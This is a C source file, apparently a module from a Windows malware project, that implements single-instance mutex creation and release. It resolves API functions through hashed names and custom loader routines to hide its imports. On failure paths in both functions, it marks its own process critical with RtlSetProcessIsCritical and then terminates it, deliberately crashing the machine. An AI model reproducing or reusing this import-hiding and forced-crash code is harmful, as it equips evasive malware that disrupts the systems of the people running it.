#include "mutex.h"
#include "custom_loaderapi.h"
#include "string_hashing.h"
#include "typedefs.h"

HANDLE _CreateMutex(LPCWSTR mutexName) {

	t_CreateMutexW CreateMutexW = (t_CreateMutexW)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), CREATEMUTEX_HASH);
	t_GetLastError GetLastError = (t_GetLastError)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), GETLASTERROR_HASH);
	t_TerminateProcess TerminateProcess = (t_TerminateProcess)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), TERMINTATEPROCESS_HASH);
	t_CloseHandle CloseHandle = (t_CloseHandle)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), CLOSEHANDLE_HASH);

	t_RtlSetProcessIsCritical SetCriticalProcess =
		(t_RtlSetProcessIsCritical)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLSETPROCESSISCRITICAL_HASH);

	HANDLE hMutex = NULL;
	
	hMutex = CreateMutexW(NULL, 1, mutexName);
	switch (GetLastError()) {
	case ERROR_ALREADY_EXISTS:
		//PRINTA("[!] Mutex already exists\n");
		goto CLEANUP;
		break;
	}

	return hMutex;

CLEANUP:

	SetCriticalProcess(TRUE, NULL, FALSE);
	CloseHandle(hMutex);
	TerminateProcess((HANDLE)-1, -1);

}

BOOL _DestroyMutex(HANDLE hMutex) {

	t_ReleaseMutex ReleaseMutex = (t_ReleaseMutex)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), RELEASEMUTEX_HASH);
	t_GetLastError GetLastError = (t_GetLastError)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), GETLASTERROR_HASH);
	t_TerminateProcess TerminateProcess = (t_TerminateProcess)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), TERMINTATEPROCESS_HASH);
	t_CloseHandle CloseHandle = (t_CloseHandle)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), CLOSEHANDLE_HASH);
	t_RtlSetProcessIsCritical SetCriticalProcess =
		(t_RtlSetProcessIsCritical)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLSETPROCESSISCRITICAL_HASH);



	// Result of the ReleaseMutex() API
	BOOL res = FALSE;

	res = ReleaseMutex(hMutex);
	if (res != 0) {
		//PRINTA("[+] Mutex released\n");
		res = TRUE;
	}
	else {
		goto CLEANUP;
	}

	return res;

CLEANUP:

	SetCriticalProcess(TRUE, NULL, FALSE);
	CloseHandle(hMutex);
	TerminateProcess((HANDLE)-1, -1);

}
